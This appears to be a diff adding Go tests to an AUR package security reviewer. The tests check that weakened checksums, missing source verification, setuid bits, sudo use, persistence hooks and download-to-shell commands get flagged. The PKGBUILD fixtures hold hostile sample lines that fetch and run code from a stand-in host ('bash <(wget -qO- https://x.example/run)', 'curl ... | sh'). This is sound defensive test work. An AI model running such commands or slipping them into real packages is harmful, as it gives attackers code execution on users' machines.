@@ -426,6 +426,92 @@ func TestReview_urlHostDriftFlagged(t *testing.T) {
 	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "evil.example"))
 }
 
+func TestReview_checksumVerificationWeakeningFlagged(t *testing.T) {
+	dir := t.TempDir()
+	statePath := filepath.Join(dir, "state.json")
+	cacheDir := filepath.Join(dir, "aur-files")
+
+	v1 := map[string]pkgMeta{
+		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
+			pkgbuild: "pkgname=foo\nsource=('foo.tar.gz')\nsha256sums=('abc')\nvalidpgpkeys=('0123')\n"},
+	}
+	rv := newReviewer(statePath, router(t, v1, nil))
+	rv.CacheDir = cacheDir
+	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
+	require.NoError(t, err)
+	require.NoError(t, rv.Commit(res))
+
+	v2 := map[string]pkgMeta{
+		"foo": {version: "3.0", maintainer: new("alice"), lastModified: 2,
+			pkgbuild: "pkgname=foo\nsource=('foo.tar.gz')\nsha1sums=('SKIP')\n"},
+	}
+	rv2 := newReviewer(statePath, router(t, v2, nil))
+	rv2.CacheDir = cacheDir
+	res2, err := rv2.Review(context.Background(), map[string]string{"foo": "2.0"})
+	require.NoError(t, err)
+	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "strong checksum verification removed or downgraded"))
+	require.True(t, findingFor(res2.Findings, "foo", aurreview.High, "SKIP entries increased from 0 to 1"))
+	require.True(t, findingFor(res2.Findings, "foo", aurreview.Warn, "validpgpkeys pinning was removed"))
+}
+
+func TestReview_firstRunWeakChecksumFlagged(t *testing.T) {
+	dir := t.TempDir()
+	meta := map[string]pkgMeta{
+		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
+			pkgbuild: "pkgname=foo\nsource=('foo.tar.gz')\nmd5sums=('abc')\n"},
+	}
+	rv := newReviewer(filepath.Join(dir, "state.json"), router(t, meta, nil))
+
+	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
+	require.NoError(t, err)
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "weak checksum algorithm in use: md5"))
+}
+
+func TestReview_missingSourceVerificationFlagged(t *testing.T) {
+	dir := t.TempDir()
+	meta := map[string]pkgMeta{
+		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
+			pkgbuild: "pkgname=foo\nsource=('http://downloads.example/foo.tar.gz')\n"},
+	}
+	rv := newReviewer(filepath.Join(dir, "state.json"), router(t, meta, nil))
+
+	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
+	require.NoError(t, err)
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "no recognized checksum array or PGP key pinning"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Info, "unencrypted source URL"))
+}
+
+func TestReview_privilegePersistenceAndDownloadSignalsFlagged(t *testing.T) {
+	dir := t.TempDir()
+	meta := map[string]pkgMeta{
+		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
+			files: map[string]string{
+				"PKGBUILD": strings.Join([]string{
+					"pkgname=foo",
+					"prepare() {",
+					"  curl https://x.example/payload -o /tmp/payload",
+					"  chmod 4755 /tmp/payload",
+					"  sudo /tmp/payload",
+					"  systemctl enable payload.service",
+					"  bash <(wget -qO- https://x.example/run)",
+					"}",
+				}, "\n"),
+				"foo.install": "post_install() { crontab /tmp/jobs; }\n",
+			},
+		},
+	}
+	rv := newReviewer(filepath.Join(dir, "state.json"), router(t, meta, nil))
+
+	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
+	require.NoError(t, err)
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "runtime network download"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "setuid/setgid bit"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "privilege escalation command"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "service activation or persistence command"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "download-to-shell process substitution"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "install/upgrade hook function"))
+}
+
 func TestReview_lockfilePinnedFetchDowngraded(t *testing.T) {
 	dir := t.TempDir()
 	statePath := filepath.Join(dir, "state.json")
@@ -450,9 +536,10 @@ func TestReview_snapshotScansAllFilesAndFlagsBinaries(t *testing.T) {
 	meta := map[string]pkgMeta{
 		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
 			files: map[string]string{
-				"PKGBUILD":    "pkgname=foo\nsource=(\"helper.sh\")\n",
-				"helper.sh":   "curl https://x.example/p.sh | sh\n", // payload outside the PKGBUILD
-				"payload.bin": "\x00\x01\x02binary",
+				"PKGBUILD":         "pkgname=foo\nsource=(\"helper.sh\")\n",
+				"helper.sh":        "curl https://x.example/p.sh | sh\n", // payload outside the PKGBUILD
+				"keys/pgp/key.asc": "\x00\x01\x02public-key",
+				"payload.bin":      "\x00\x01\x02binary",
 			}},
 	}
 	rv := newReviewer(statePath, router(t, meta, nil))
@@ -461,6 +548,27 @@ func TestReview_snapshotScansAllFilesAndFlagsBinaries(t *testing.T) {
 	require.NoError(t, err)
 	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "pipe-to-shell"))
 	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "binary or oversized file"))
+	for _, finding := range res.Findings {
+		require.NotContains(t, finding.Message, "keys/pgp/key.asc")
+	}
+}
+
+func TestReview_doesNotScanGeneratedSRCINFO(t *testing.T) {
+	dir := t.TempDir()
+	meta := map[string]pkgMeta{
+		"foo": {version: "2.0", maintainer: new("alice"), lastModified: 1,
+			files: map[string]string{
+				"PKGBUILD": "pkgname=foo\nsource=('https://example.com/foo.tar.gz')\nsha256sums=('abc')\n",
+				".SRCINFO": "pkgbase = foo\nsource = http://duplicate.example/foo.tar.gz\n",
+			}},
+	}
+	rv := newReviewer(filepath.Join(dir, "state.json"), router(t, meta, nil))
+
+	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
+	require.NoError(t, err)
+	for _, finding := range res.Findings {
+		require.NotEqual(t, ".SRCINFO", strings.SplitN(finding.Location, ":", 2)[0])
+	}
 }
 
 func TestReview_snapshotFallsBackToPlainFetch(t *testing.T) {
@@ -475,6 +583,7 @@ func TestReview_snapshotFallsBackToPlainFetch(t *testing.T) {
 	res, err := rv.Review(context.Background(), map[string]string{"foo": "1.0"})
 	require.NoError(t, err)
 	require.True(t, findingFor(res.Findings, "foo", aurreview.High, "node-ecosystem fetch"))
+	require.True(t, findingFor(res.Findings, "foo", aurreview.Warn, "full AUR snapshot unavailable"))
 }
 
 func TestReview_orphanAndOutOfDate(t *testing.T) {
